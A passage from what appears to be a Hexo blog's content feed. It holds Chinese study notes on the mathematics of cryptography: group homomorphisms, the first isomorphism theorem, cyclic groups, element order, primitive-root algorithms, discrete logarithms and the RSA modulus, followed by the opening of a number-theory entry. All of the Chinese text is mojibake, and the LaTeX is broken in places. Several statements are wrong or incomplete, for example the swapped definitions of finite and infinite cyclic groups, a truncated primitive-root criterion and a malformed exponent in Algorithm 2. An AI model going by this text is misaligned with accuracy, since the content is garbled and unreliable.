href="#åŒæ€æ ¸" class="headerlink" title="åŒæ€æ ¸"></a>åŒæ€æ ¸</h3><p><strong>åŒæ€æ ¸</strong>$Kerf:=\{a\in G|f(a)=e^{\prime}\},(åŒæ€æ ¸Kerfæ˜¯Gçš„å­ç¾¤)$</p><p>$(e^{\prime}$è¡¨ç¤º$G^\prime$çš„å•ä½å…ƒ)</p><p><strong>å®šç†</strong>ï¼š$f{:}G\to G^{\prime}\text{ æ˜¯ç¾¤åŒæ€,åˆ™Ker }f\text{æ˜¯æ­£è§„å­ç¾¤}$</p><h3 id="ç¾¤åŒæ€çš„å¤åˆ"><a href="#ç¾¤åŒæ€çš„å¤åˆ" class="headerlink" title="ç¾¤åŒæ€çš„å¤åˆ"></a>ç¾¤åŒæ€çš„å¤åˆ</h3><p><strong>å®šç†</strong>ï¼š$f$æ˜¯$(G,*)$åˆ°$(G^\prime,\otimes)$çš„ç¾¤åŒæ€ï¼Œ$f^\prime$æ˜¯$(G^\prime,\otimes)$åˆ°$(G^{\prime\prime}$,ç”°)çš„ç¾¤åŒæ€ï¼Œåˆ™$f$å’Œ$f^\prime$çš„å¤åˆ</p><script type="math/tex; mode=display">f^{\prime}\circ f{:}G\to G^{\prime\prime}ä¹Ÿæ˜¯ç¾¤åŒæ€</script><h3 id="åˆ¤æ–­å•ä¸€åŒæ€"><a href="#åˆ¤æ–­å•ä¸€åŒæ€" class="headerlink" title="åˆ¤æ–­å•ä¸€åŒæ€"></a>åˆ¤æ–­å•ä¸€åŒæ€</h3><p><strong>å®šç†1</strong>ï¼š</p><script type="math/tex; mode=display">f: G\to G^{\prime}æ˜¯ç¾¤åŒæ€,\forall a,b\in G,æœ‰\\f(a)=f(b)\Leftrightarrow a\equiv b\pmod {Ker f}</script><p><strong>å®šç†2</strong>ï¼š</p><script type="math/tex; mode=display">f: G\to G^{\prime}æ˜¯ç¾¤åŒæ€,æœ‰\\fæ˜¯å•å°„ \Longleftrightarrow Kerf=\{e\}</script><h3 id="åˆ¤æ–­æ»¡åŒæ€"><a href="#åˆ¤æ–­æ»¡åŒæ€" class="headerlink" title="åˆ¤æ–­æ»¡åŒæ€"></a>åˆ¤æ–­æ»¡åŒæ€</h3><p>$f\text{æ˜¯æ»¡åŒæ€}\Leftrightarrow Imf=G^{\prime}$</p><h3 id="åµŒå…¥æ˜ å°„-inclusion-map"><a href="#åµŒå…¥æ˜ å°„-inclusion-map" class="headerlink" title="åµŒå…¥æ˜ å°„(inclusion map)"></a>åµŒå…¥æ˜ å°„(inclusion map)</h3><p>$H \to G$</p><p>$a\to f(a)=a$</p><p>å­ç¾¤å…ƒç´ ç›´æ¥æ˜ å°„åˆ°è‡ªèº«</p><p>å­ç¾¤åˆ°ç¾¤çš„åµŒå…¥æ˜ å°„æ˜¯ä¸ªç¾¤åŒæ€<br>åŸåƒå’Œåƒä¹‹é—´æ˜¯ä¸€å¯¹ä¸€çš„ï¼Œå•å°„</p><p><strong>å•ä¸€åŒæ€ï¼š$f$æ˜¯å•å°„</strong></p><h3 id="è‡ªç„¶æ˜ å°„-natural-map"><a href="#è‡ªç„¶æ˜ å°„-natural-map" class="headerlink" title="è‡ªç„¶æ˜ å°„(natural map)"></a>è‡ªç„¶æ˜ å°„(natural map)</h3><p>$G \to G/N,(Næ˜¯Gçš„æ­£è§„å­ç¾¤)$</p><p>$a\to f(a)=[a]_N$</p><p><strong>è‡ªç„¶æ˜ å°„çš„åŒæ€æ ¸å°±æ˜¯æ­£è§„å­ç¾¤N</strong></p><p><strong>æ»¡åŒæ€ï¼š$f$æ˜¯æ»¡å°„</strong></p><h3 id="mæ¬¡æ–¹æ˜ å°„-m-power-map"><a href="#mæ¬¡æ–¹æ˜ å°„-m-power-map" class="headerlink" title="mæ¬¡æ–¹æ˜ å°„(m-power map)"></a>mæ¬¡æ–¹æ˜ å°„(m-power map)</h3><p>$Gæ˜¯é˜¿è´å°”ç¾¤$</p><p>$G \to G$</p><p>$a\to f(a)=a^m$</p><p>$Imf=G^m$</p><p>$Kerf=G\{m\}$</p><h3 id="é›…å¯æ¯”æ˜ å°„-Jacobi-map"><a href="#é›…å¯æ¯”æ˜ å°„-Jacobi-map" class="headerlink" title="é›…å¯æ¯”æ˜ å°„(Jacobi map)"></a>é›…å¯æ¯”æ˜ å°„(Jacobi map)</h3><p>$\mathbb{Z}_n^* \to \{\pm 1\}$</p><p>$a\to J_n(a)=(\frac an)$</p><hr><h2 id="ç¾¤åŒæ„-group-isomorphism"><a href="#ç¾¤åŒæ„-group-isomorphism" class="headerlink" title="ç¾¤åŒæ„(group isomorphism)"></a>ç¾¤åŒæ„(group isomorphism)</h2><ul><li><p><strong>åŒå°„(å•å°„&amp;æ»¡å°„)</strong></p></li><li><p><strong>ç¾¤åŒæ€</strong></p></li></ul><p>$G$ä¸$G^\prime$åŒæ„ï¼Œè®°ä¸º$G\cong G^\prime$<br>$G$ä¸$G$ä¹‹é—´çš„åŒæ„ï¼šè‡ªåŒæ„(group automorphism)</p><h3 id="ç¬¬ä¸€åŒæ„å®šç†-first-isomorphism-theorem"><a href="#ç¬¬ä¸€åŒæ„å®šç†-first-isomorphism-theorem" class="headerlink" title="ç¬¬ä¸€åŒæ„å®šç†(first isomorphism theorem)"></a>ç¬¬ä¸€åŒæ„å®šç†(first isomorphism theorem)</h3><p>åˆç§°ï¼šåŸºæœ¬åŒæ€å®šç† (FHT, fundamental homomorphism theorem)</p><p>å®šç†ï¼šè®¾ç¾¤<script type="math/tex">(G,*)</script>å’Œç¾¤$( G^\prime , \otimes )$, $f{: }G\to G^\prime$ æ˜¯ç¾¤åŒæ€($åŒ<br>æ€æ ¸æ˜¯Kerfï¼ŒåŒæ€åƒæ˜¯Imf$),åˆ™</p><script type="math/tex; mode=display">G/Kerf\cong Imf</script><script type="math/tex; mode=display">\rho:[a]_{Kerf}\quad f(a)</script><hr><h2 id="å¾ªç¯ç¾¤-cyclic-group"><a href="#å¾ªç¯ç¾¤-cyclic-group" class="headerlink" title="å¾ªç¯ç¾¤(cyclic group)"></a>å¾ªç¯ç¾¤(cyclic group)</h2><p>å­©å­ä»¬ï¼Œå»å¾€ä¸Šå›å¿†ä¸€ä¸‹<strong>æ„é€ å­ç¾¤Â·æ–¹æ³•3</strong></p><p>å®šä¹‰ï¼šè®¾$G$æ˜¯ç¾¤ï¼Œ$g\in G$,å¦‚æœ</p><script type="math/tex; mode=display">G=<g>,</script><p>åˆ™ç§°$G$æ˜¯<strong>å¾ªç¯ç¾¤</strong>ï¼Œ$g$æ˜¯å¾ªç¯ç¾¤$G$çš„<strong>ç”Ÿæˆå…ƒ(generator)</strong>(å¯ä»¥æœ‰ä¸æ­¢ä¸€ä¸ªä¸ªç”Ÿæˆå…ƒ)ã€‚</p><ul><li><p><strong>æœ‰é™å¾ªç¯ç¾¤</strong>ï¼šç¾¤å…ƒç´ ä¸ªæ•°æ˜¯æ— é™çš„ï¼ŒåŒæ„äº$\mathbb{Z}$</p><p><strong>ä»»æ„æ— é™å¾ªç¯ç¾¤éƒ½åªæœ‰2ä¸ªç”Ÿæˆå…ƒ</strong></p></li><li><p><strong>æ— é™å¾ªç¯ç¾¤</strong>ï¼šç¾¤å…ƒç´ ä¸ªæ•°æ˜¯æœ‰é™çš„,åŒæ„äº$\mathbb{Z}_n$</p></li></ul><p><strong>å®šç†</strong>ï¼šä»»æ„å¾ªç¯ç¾¤éƒ½æ˜¯é˜¿è´å°”ç¾¤</p><p><strong>å®šç†</strong>ï¼šå¾ªç¯ç¾¤çš„å­ç¾¤æ˜¯å¾ªç¯ç¾¤</p><p><strong>å®šç†</strong>ï¼šè®¾$G$æ˜¯å¾ªç¯ç¾¤(ç”Ÿæˆå…ƒg)ï¼Œ$H$æ˜¯å…¶å­ç¾¤ï¼Œåˆ™å•†ç¾¤$G/H$æ˜¯å¾ªç¯ç¾¤(ç”Ÿæˆå…ƒ$[g]_H$)</p><h3 id="å¾ªç¯ç¾¤çš„åŒæ„"><a href="#å¾ªç¯ç¾¤çš„åŒæ„" class="headerlink" title="å¾ªç¯ç¾¤çš„åŒæ„"></a>å¾ªç¯ç¾¤çš„åŒæ„</h3><p>1.<script type="math/tex">\begin{aligned}\text{å¯¹äºæ— é™å¾ªç¯ç¾¤}G\text{çš„ä»»æ„å­ç¾¤}H\text{,éƒ½å­˜åœ¨å”¯ä¸€çš„é}\text{è´Ÿæ•´æ•°}m\text{,ä½¿å¾—}H=G^mã€‚\end{aligned}</script></p><p>2.<script type="math/tex">å¯¹äºné˜¶æœ‰é™å¾ªç¯ç¾¤Gçš„ä»»æ„å­ç¾¤H,éƒ½å­˜åœ¨nçš„å”¯ä¸€æ­£å› å­m,ä½¿å¾—H=G^m</script></p><hr><h2 id="å…ƒç´ çš„é˜¶-order"><a href="#å…ƒç´ çš„é˜¶-order" class="headerlink" title="å…ƒç´ çš„é˜¶(order)"></a>å…ƒç´ çš„é˜¶(order)</h2><p><strong>å®šä¹‰</strong>ï¼šè®¾$G$æ˜¯ç¾¤ï¼Œ$a\in G$,å¦‚æœ$n$æ˜¯æ»¡è¶³$a^n=e$çš„<strong>æœ€å°æ­£æ•´æ•°</strong>ï¼Œåˆ™ç§°$n$æ˜¯å…ƒç´ $a$çš„<strong>é˜¶</strong>ã€‚</p><blockquote><p>PS:å­˜åœ¨<strong>æ— é™é˜¶</strong>çš„å…ƒç´ </p></blockquote><p>æ€§è´¨$1:G$æ˜¯ç¾¤ï¼Œå…ƒç´ $a$çš„é˜¶æ˜¯$n$ (a$^n=e)$,åˆ™$\forall m\in Z$,æœ‰$n|m\Leftrightarrow a^m=e_0$</p><p>æ€§è´¨$2:$æœ‰é™å¾ªç¯ç¾¤çš„é˜¶æ˜¯$n$,åˆ™ç”Ÿæˆå…ƒ$g$çš„é˜¶ä¹Ÿæ˜¯$n$,ä¸”ç¾¤é‡Œå…ƒç´  $g,g^2,g^3,â€¦,g^n(=g^0=e)$å„ä¸ç›¸åŒã€‚</p><p>æ€§è´¨$3:$æ­£æ•´æ•°$d\mid n$, $n$é˜¶æœ‰é™å¾ªç¯ç¾¤æ°æœ‰å”¯ä¸€çš„$d$é˜¶å­ç¾¤$<g^\frac nd>$</g^\frac></p><p>æ€§è´¨$4:<script type="math/tex">n$é˜¶æœ‰é™å¾ªç¯ç¾¤</script><g><script type="math/tex">,</script>\forall k\in Z<script type="math/tex">,æœ‰</script>g^k<script type="math/tex">çš„é˜¶æ˜¯</script>\frac n{gcd(n,k)}$$</g></p><p>æ€§è´¨$5:$$n$é˜¶æœ‰é™å¾ªç¯ç¾¤æœ‰$\phi(n)$ ä¸ªç”Ÿæˆå…ƒã€‚</p><p>æ€§è´¨$6:$$G$æ˜¯æœ‰é™ç¾¤ï¼Œå…ƒç´ $a$çš„é˜¶æ˜¯$|G|$çš„å› å­ã€‚</p><p>æ€§è´¨$7:$ç´ æ•°é˜¶çš„ç¾¤å¿…ç„¶æ˜¯<strong>æœ‰é™å¾ªç¯ç¾¤</strong></p><p>æ€§è´¨$8:<script type="math/tex">$\begin{aligned}G\text{æ˜¯}n\text{é˜¶æœ‰é™å¾ªç¯ç¾¤,}d\text{æ˜¯}n\text{çš„æ­£å› å­,}G\text{é‡Œçš„}d\text{é˜¶}\text{å…ƒç´ ä¸€å…±æœ‰}\phi(d)\text{ä¸ªã€‚}\end{aligned}</script></p><hr><h2 id="åŸæ ¹-primitive-root"><a href="#åŸæ ¹-primitive-root" class="headerlink" title="åŸæ ¹(primitive root)"></a>åŸæ ¹(primitive root)</h2><p>ä¸å¦¨å…ˆå»å¤ä¹ ä¸€ä¸‹<strong>å·ä¸€(æ•°è®º)</strong>ä¸­çš„<strong>ä¹˜æ³•é˜¶</strong>æ¦‚å¿µ</p><p>$gä¸€èˆ¬è¡¨ç¤ºç”Ÿæˆå…ƒ$</p><p><strong>å®šä¹‰</strong>ï¼š$g\in\mathbb{Z},gcd(g,n)=1$,å¦‚æœ$ord_n(g)=\phi(n)$,ç§°$g$æ˜¯æ¨¡$n$ä¸‹çš„<strong>åŸæ ¹</strong>ã€‚</p><ul><li>$g$æ˜¯æ¨¡$n$ä¸‹çš„åŸæ ¹ï¼Œåˆ™$g^{ord_n(g)}\equiv g^{\phi(n)}\equiv1\left({\mathrm{mod~}}n\right)$ã€‚</li></ul><p>åŸæ ¹çš„é˜¶æ˜¯$\phi(n)$,<script type="math/tex">Z_n^*</script>çš„é˜¶ä¹Ÿæ˜¯$\phi(n)\Longrightarrow$åŸæ ¹æ˜¯<script type="math/tex">Z_n^*</script>çš„ç”Ÿæˆå…ƒ<script type="math/tex">\Longrightarrow\mathbb{Z}_n^*</script>æ˜¯å¾ªç¯ç¾¤</p><blockquote><script type="math/tex; mode=display">Z_n^*$$é‡Œï¼Œâ€œå…ƒç´ çš„é˜¶â€å°±æ˜¯å…ƒç´ çš„â€œä¹˜æ³•é˜¶â€æ¨¡$n$ä¸‹å­˜åœ¨åŸæ ¹çš„è¯ï¼Œ$$Z_n^*$$æ˜¯å¾ªç¯ç¾¤ï¼Œâ€œç”Ÿæˆå…ƒâ€å°±æ˜¯â€œåŸæ ¹â€$$(n=1,2,4,p^e,2p^e)</script></blockquote><p>$\forall k\in\mathbb{Z}\text{,}g^k\text{çš„ä¹˜æ³•é˜¶æ˜¯ }\frac{\phi(n)}{gcd(\phi(n),k)}$</p><script type="math/tex; mode=display">Z_p^*\text{é‡Œ,}\forall k\in Z\text{,}g^k\text{çš„ä¹˜æ³•é˜¶æ˜¯}\frac{p-1}{gcd(p-1,k)}</script><p>æ¨¡nä¸‹åŸæ ¹ä¸€å…±$\phi(\phi(n))$ä¸ª</p><script type="math/tex; mode=display">\mathbb{Z}_p^*\text{çš„ç”Ÿæˆå…ƒä¸€å…±}\phi(p-1)\text{ä¸ª}</script><h3 id="åŸæ ¹å­˜åœ¨çš„æ¡ä»¶"><a href="#åŸæ ¹å­˜åœ¨çš„æ¡ä»¶" class="headerlink" title="åŸæ ¹å­˜åœ¨çš„æ¡ä»¶"></a>åŸæ ¹å­˜åœ¨çš„æ¡ä»¶</h3><p>è®¾$p$æ˜¯<strong>å¥‡ç´ æ•°</strong>ï¼Œ$e$æ˜¯<strong>æ­£æ•´æ•°</strong><br>$n=1,2,4,p^e,2p^e$ æ—¶ï¼Œæ¨¡$n$ä¸‹å­˜åœ¨åŸæ ¹</p><script type="math/tex; mode=display">Z_p^*\text{é‡Œ,}\forall k\in Z\text{,}g^k\text{æ˜¯åŸæ ¹}\Leftrightarrow gcd(p-1,k)</script><h3 id="å¯»æ‰¾åŸæ ¹-ç”Ÿæˆå…ƒ-çš„ç®—æ³•"><a href="#å¯»æ‰¾åŸæ ¹-ç”Ÿæˆå…ƒ-çš„ç®—æ³•" class="headerlink" title="å¯»æ‰¾åŸæ ¹(ç”Ÿæˆå…ƒ)çš„ç®—æ³•"></a>å¯»æ‰¾åŸæ ¹(ç”Ÿæˆå…ƒ)çš„ç®—æ³•</h3><script type="math/tex; mode=display">\begin{aligned}&\forall a\in\mathbf{Z}_n^*\Longrightarrow ard_n(a)|\phi(n)\\&a\text{æ˜¯åŸæ ¹}\Longrightarrow ord_n(a)=\phi(n)\\&\text{è®¾ }\phi(n)=p_1^{e_1}...p_r^{e_r}\\&a\text{ä¸æ˜¯åŸæ ¹}\Longrightarrow\exists d|\phi(n),d<\phi(n),a^d=1 \pmod n\\&\Longrightarrow\exists p_j,d|\frac{\phi(n)}{p_j} \Longrightarrow\exists q,dq=\frac{\phi(n)}{p_j}\\&a^d\equiv1 \pmod n\Longrightarrow a^{\frac{\phi(n)}{p_j}}\equiv a^{dq}\equiv(a^d)^q\equiv1 \pmod n\end{aligned}</script><p><strong>ç®—æ³•1</strong>ï¼š</p><blockquote><p>step1.$å› å­åˆ†è§£\phi(n),æ±‚å‡ºå…¶å„ä¸ªç´ å› å­ p_1,â€¦,p_r$</p><p>step2.ä»»é€‰$a\in\mathbb{Z}_n^*$</p><p>step3.$if\ a^\frac{\phi(n)}{p_i} \not\equiv1(mod\: n),i=1,â€¦,r$</p><p>â€‹        output a</p><p>else goto step2.</p></blockquote><p><strong>ç®—æ³•2</strong>:<script type="math/tex">\text{å¦‚ä½•æ‰¾}Z_p^*\text{çš„åŸæ ¹(ç”Ÿæˆå…ƒ)}\\\text{è®¾ }p\text{ æ˜¯å¥‡ç´ æ•°,}\phi(p)=p-1=p_1^{t_1}...p_r^{t_r}</script></p><blockquote><p>for $i=1$â€‹ to $r$</p><p>{</p><p>do{</p><p>â€‹        ä»»é€‰$a\in Z_p^*$</p><p>} while $(a^{\frac{p-1}{p_i}}\equiv1$ (mod $p))$</p><p>$c_i\equiv a^{p_i{\frac{p-1}{t_i}}}\pmod p$</p><p>}</p><p>output $\prod_{i=1}^rc_i\pmod p$ </p><p><strong>å®šç†1</strong>ï¼šè®¾$G$æ˜¯ç¾¤ï¼Œ$c\in G$,å¯¹äºæŸä¸ªç´ æ•°$p$å’Œæ•´æ•°$t\geq1$,å¦‚æœ<br>$c^{p^t}=e$ ä½† $c^{p^{t-1}}\neq e$,åˆ™$c$çš„é˜¶æ˜¯$p^t$ã€‚</p><p><strong>å®šç†2</strong>ï¼šè®¾$G$æ˜¯ç¾¤ï¼Œ$c_1,c_2\in G$,$c_1,c_2$çš„é˜¶åˆ†åˆ«ä¸º$m_1,m_2$,ä¸”$gcd(\boldsymbol{m}_1,\boldsymbol{m}_2)=1$,åˆ™<script type="math/tex">c_1*c_2</script>çš„é˜¶æ˜¯$m_1m_2$ã€‚</p></blockquote><hr><h2 id="ç¦»æ•£å¯¹æ•°-discrete-logarithm"><a href="#ç¦»æ•£å¯¹æ•°-discrete-logarithm" class="headerlink" title="ç¦»æ•£å¯¹æ•°(discrete logarithm)"></a>ç¦»æ•£å¯¹æ•°(discrete logarithm)</h2><p>$n=1,2,4,p^e,2p^e$æ—¶ï¼Œå­˜åœ¨åŸæ ¹ (è®¾ä¸º$g),Z_n^*$æ˜¯å¾ªç¯ç¾¤</p><p><strong>å®šä¹‰</strong>ï¼š$gcd(a,n)=1$,å¿…å­˜åœ¨<strong>å”¯ä¸€æ•´æ•°</strong>$x(0\leq x&lt;\phi(n))$<br>æœ‰ $a\equiv g^{x}\pmod n$,åˆ™ç§°$x$æ˜¯ä»¥$g$ä¸ºåº•çš„$a$æ¨¡$n$çš„<strong>æŒ‡æ ‡</strong><br>(index)æˆ–<strong>ç¦»æ•£å¯¹æ•°(discrete logarithm)</strong>ã€‚</p><p>ç®€è®°ä¸ºï¼š$x=log_g(a)$</p><script type="math/tex; mode=display">1\equiv g^0(modn)\Longrightarrow log_g(1)=0\\g\equiv g^1(modn)\Longrightarrow log_g(g)=1</script><p><strong>å®šç†</strong>ï¼š$a\equiv g^r\pmod n\Leftrightarrow log_g(a)\equiv r\pmod{\phi(n)}$</p><blockquote><script type="math/tex; mode=display">\begin{aligned}\text{è®¾ }x=log_g(a), &\text{åˆ™ }a\equiv g^x(\mathrm{mod~}n) \\a\equiv g^r (mod n) &\Leftrightarrow g^x\equiv g^r\mathrm{~}(mod\mathrm{~}n) \\&\Leftrightarrow x\equiv r\pmod{\phi(n)} \\&\Leftrightarrow log_g(a)\equiv r\pmod{\phi(n)}\end{aligned}</script></blockquote><p><strong>æ€§è´¨1</strong>:$log_g(ab)\equiv log_g(a)+log_g(b)\pmod {\phi(n)}$</p><p><strong>æ€§è´¨2</strong>:$log_g(a^m)\equiv m\times log_g(a)\pmod {\phi(n)}$</p><p><strong>æ€§è´¨3</strong>:$log_h(a)\equiv log_h(g)\times log_g(a)\pmod {\phi(n)}$</p><h3 id="ç¦»æ•£å¯¹æ•°é—®é¢˜-DLP-discrete-logarithm-problem"><a href="#ç¦»æ•£å¯¹æ•°é—®é¢˜-DLP-discrete-logarithm-problem" class="headerlink" title="ç¦»æ•£å¯¹æ•°é—®é¢˜(DLP,discrete logarithm problem)"></a>ç¦»æ•£å¯¹æ•°é—®é¢˜(DLP,discrete logarithm problem)</h3><p><strong>å®šä¹‰</strong>ï¼šè®¾$G$æ˜¯å¾ªç¯ç¾¤ï¼Œ$g\in G$æ˜¯ç”Ÿæˆå…ƒï¼Œå¯¹äº$y\in G$å’Œæ­£<br>æ•´æ•°$x$,æœ‰ $y=g^x$,åˆ™ç¦»æ•£å¯¹æ•°é—®é¢˜å®šä¹‰ä¸ºï¼š<br>ç»™å®š$y$å’Œ$g$,æ±‚$x (=log_g(y))$ã€‚</p><p>ç›®å‰æ— é«˜æ•ˆç®—æ³•</p><hr><h2 id="RSAçš„æ¨¡æ•°"><a href="#RSAçš„æ¨¡æ•°" class="headerlink" title="RSAçš„æ¨¡æ•°"></a>RSAçš„æ¨¡æ•°</h2><p>RSAçš„æ‰€æœ‰è®¡ç®—éƒ½æ˜¯åœ¨$\mathbb{Z}_n^*$ä¸Šè¿›è¡Œçš„</p><p>$n=pq$</p><p>$\phi(n)=\phi(pq)=\phi(p)\phi(q)=(p-1)(q-1)$</p><p>$\forall a\in \mathbb{Z}_n^*,ord_n(a)\mid (p-1)(q-1)$</p><p>$è®¾\lambda(n)=lcm(p-1,q-1)&lt;(p-1)(q-1)$</p><p>$\mathbb{Z}_n^*æ²¡æœ‰åŸæ ¹ï¼ˆç”Ÿæˆå…ƒï¼‰ï¼Œä¸æ˜¯å¾ªç¯ç¾¤$</p><p><strong>å®šç†</strong>ï¼š<script type="math/tex">\mathbb{Z}_n^*ä¸­ä»»æ„å…ƒç´ çš„é˜¶éƒ½æ˜¯\lambda(n)çš„å› å­</script></p><script type="math/tex; mode=display">\mathbb{Z}_n^*$$ä¸­æ²¡æœ‰åŸæ ¹(ç”Ÿæˆå…ƒ)ï¼Œä¸æ˜¯å¾ªç¯ç¾¤$$Z_p^*$$å’Œ$$Z_q^*$$éƒ½æ˜¯å¾ªç¯ç¾¤ (å› ä¸º$p$å’Œ$q$æ˜¯ç´ æ•°ï¼Œæ»¡è¶³äº”ç§æƒ…å†µä¹‹ä¸€)$$\mathbb{Z}_p^*$$é‡Œå…ƒç´ æœ€å¤§é˜¶ä¸º$p-1$$$Z_q^*$$é‡Œå…ƒç´ æœ€å¤§é˜¶ä¸º$q-1$$$\mathbb{Z}_n^*$$é‡Œå…ƒç´ æœ€å¤§é˜¶ä¸º$\lambda(n)$**ç»“è®º**ï¼š$$Z_n^*$$çš„é˜¶æ˜¯$\phi(n)$,å…ƒç´ æœ€å¤§é˜¶ä¸º$\lambda(n)$$$\forall a\in Z_n^*$$,ç”±$ord_p(a)$å’Œ$ord_\mathfrak{q}(a)$å¦‚ä¸‹è®¡ç®—$ord_n(a):$$$ord_n(a)=lcm(ord_p(a),ord_q(a))</script><blockquote><p><strong>æ³¨æ„</strong>ï¼šæœ‰çš„<script type="math/tex">a\in\mathbb{Z}_n^*</script>,     $a$çš„é˜¶$ord_n(\boldsymbol{a})=\lambda(\boldsymbol{n})$,ä½†æ˜¯<br>$ord_p(a)&lt;p-1$å’Œ/æˆ–$ord_q(a)&lt;q-1$</p></blockquote><hr><h2 id="è¡¥å……ï¼šç¾¤çš„ä½“ç³»"><a href="#è¡¥å……ï¼šç¾¤çš„ä½“ç³»" class="headerlink" title="è¡¥å……ï¼šç¾¤çš„ä½“ç³»"></a>è¡¥å……ï¼šç¾¤çš„ä½“ç³»</h2><p><strong>å¹¿ç¾¤(groupoid)</strong>ï¼š<script type="math/tex">(A,*)</script>ï¼Œä»…æ»¡è¶³<strong>å°é—­æ€§</strong></p><p><strong>åŠç¾¤(semigroup)</strong>ï¼š<script type="math/tex">(A,*)</script>ï¼Œæ»¡è¶³å°é—­æ€§ï¼Œ<strong>ç»“åˆå¾‹</strong></p><p><strong>å¹ºåŠç¾¤(monoid,ç‹¬å¼‚ç‚¹)</strong>ï¼š<script type="math/tex">(A,*)</script>ï¼Œæ»¡è¶³å°é—­æ€§ï¼Œç»“åˆå¾‹ï¼Œæœ‰<strong>å•ä½å…ƒ(å¹ºå…ƒ)</strong></p><p><strong>ç¾¤(group)</strong>ï¼š<script type="math/tex">(A,*)</script>ï¼Œæ»¡è¶³å°é—­æ€§ï¼Œç»“åˆå¾‹ï¼Œæœ‰å•ä½å…ƒ(å¹ºå…ƒ)ï¼Œæ¯ä¸ªå…ƒç´ éƒ½æœ‰<strong>é€†å…ƒ</strong></p><p><strong>é˜¿è´å°”ç¾¤</strong>ï¼š<script type="math/tex">(A,*)</script>ï¼Œæ»¡è¶³å°é—­æ€§ï¼Œç»“åˆå¾‹ï¼Œæœ‰å•ä½å…ƒ(å¹ºå…ƒ)ï¼Œæ¯ä¸ªå…ƒç´ éƒ½æœ‰é€†å…ƒï¼Œè¿ç®—è¿˜æ»¡è¶³<strong>äº¤æ¢å¾‹</strong></p><p><strong>å¾ªç¯ç¾¤</strong>ï¼šå…·æœ‰ç”Ÿæˆå…ƒçš„<strong>é˜¿è´å°”ç¾¤</strong></p><hr><h1 id="å®Œç»“æ’’èŠ±"><a href="#å®Œç»“æ’’èŠ±" class="headerlink" title="å®Œç»“æ’’èŠ±"></a>å®Œç»“æ’’èŠ±</h1><p>â˜…,Â°<em>:.â˜†(ï¿£â–½ï¿£)/$:</em>.Â°â˜…<em> ã€‚<em>*çˆ±æ¥è‡ªğŸ˜½C.A.TğŸ˜¸å–µ</em></em></p>]]></content>
      
      
      <categories>
          
          <category> Cryptoæ•°å­¦åŸºç¡€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å¯†ç å­¦ </tag>
            
            <tag> ç­‘åŸºç¯‡ </tag>
            
            <tag> æŠ½è±¡ä»£æ•° </tag>
            
            <tag> ç¾¤è®º </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç­‘åŸºç¯‡Â·åˆç­‰æ•°è®º</title>
      <link href="/2024/07/30/%E7%AD%91%E5%9F%BA%E7%AF%87%C2%B7%E5%88%9D%E7%AD%89%E6%95%B0%E8%AE%BA/"/>
      <url>/2024/07/30/%E7%AD%91%E5%9F%BA%E7%AF%87%C2%B7%E5%88%9D%E7%AD%89%E6%95%B0%E8%AE%BA/</url>
      
        <content type="html"><![CDATA[<h2 id="å¯†ç å­¦å­¦ä¹ ç¬”è®°â€”â€”ç­‘åŸºç¯‡Â·å·ä¸€ï¼ˆåˆç­‰æ•°è®ºï¼‰"><a href="#å¯†ç å­¦å­¦ä¹ ç¬”è®°â€”â€”ç­‘åŸºç¯‡Â·å·ä¸€ï¼ˆåˆç­‰æ•°è®ºï¼‰" class="headerlink" title="å¯†ç å­¦å­¦ä¹ ç¬”è®°â€”â€”ç­‘åŸºç¯‡Â·å·ä¸€ï¼ˆåˆç­‰æ•°è®ºï¼‰"></a><strong>å¯†ç å­¦å­¦ä¹ ç¬”è®°â€”â€”ç­‘åŸºç¯‡Â·å·ä¸€ï¼ˆåˆç­‰æ•°è®ºï¼‰</strong></h2><hr><h3 id="è¯´åœ¨å‰é¢"><a href="#è¯´åœ¨å‰é¢" class="headerlink" title="è¯´åœ¨å‰é¢"></a>è¯´åœ¨å‰é¢</h3><p>åœ¨å­¦ä¹ ã€æ¯”èµ›çš„è¿‡ç¨‹ä¸­ï¼Œæ„Ÿè§‰æ²¡æœ‰æ•°ç«åŸºç¡€çš„åŒå­¦å…¥å‘CryptoçœŸçš„å¾ˆç—›è‹¦ï¼Œå¾ˆå¤š<strong>æ¦‚å¿µå’Œç¬¦å·</strong>éƒ½ä¸æ‡‚ã€‚</p><p>æ‰€ä»¥åœ¨æ­¤åˆ†äº«è‡ªå·±çš„æ•°å­¦åŸºç¡€å­¦ä¹ ç¬”è®°(ä¹å¹´åˆ¶ä¹‰åŠ¡æ•™è‚²éƒ½èƒ½çœ‹å¾—æ‡‚çš„é‚£ç§ï¼Œå»ºè®®åŠ å…¥ä¸­è€ƒğŸ˜€),å› ä¸ºéƒ½æ˜¯åŸºç¡€çŸ¥è¯†ï¼Œå°±å‘½åä¸ºã€Šç­‘åŸºç¯‡ã€‹å§ï¼Œå¸Œæœ›èƒ½å‡è½»å¤§å®¶å…¥å‘å¯†ç çš„ç—›æ„Ÿï¼Œå¤§å®¶ä¸€èµ·å¿«ä¹çš„å­¦ä¹ å§ï¼ï¼ï¼</p><p>å½“ç„¶ï¼Œçœ‹æˆ‘è¿™ç¯‡ç¬”è®°è‚¯å®šæ˜¯ä¸å¤Ÿçš„ï¼Œæœ‰äº›è¯æ˜è¿‡ç¨‹æˆ‘ä¹Ÿæ˜¯ç›´æ¥çœç•¥äº†ï¼Œå¤§å®¶è¿˜æ˜¯è¦æŠŠå¯†ç å­¦æ¶‰åŠåˆ°çš„å…¨éƒ¨çŸ¥è¯†ç³»ç»Ÿçš„å­¦ä¹ ä¸€éï¼Œå¾ˆé‡è¦çš„ä¸€ç‚¹æ˜¯<strong>å­¦ä¼šåŠ¨ç¬”ï¼</strong>ã€‚</p><p>å¦‚æœä»¥åæˆ‘æ¶¦åˆ«çš„æ–¹å‘äº†ï¼Œä¹Ÿç®—ç»™è‡ªå·±çš„CTFçš„Cryptoç”Ÿæ¶¯ä¸€ä»½ç»“æœã€‚</p><p>å¦‚æœæœ‰é”™è¯¯ä¹Ÿ<strong>æ³è¯·å¤§å®¶æŒ‡æ­£</strong>ï¼Œçˆ±æ¥è‡ªNJUSTã€‚</p><p><strong>é‚£ä¹ˆï¼Œç­‘åŸºç¯‡ï¼Œæ­£å¼å¼€å§‹!!!!!</strong></p><blockquote><p>PS1ï¼šç”±äºå„äººç¼–è¾‘å™¨çš„ä½¿ç”¨ä¹ 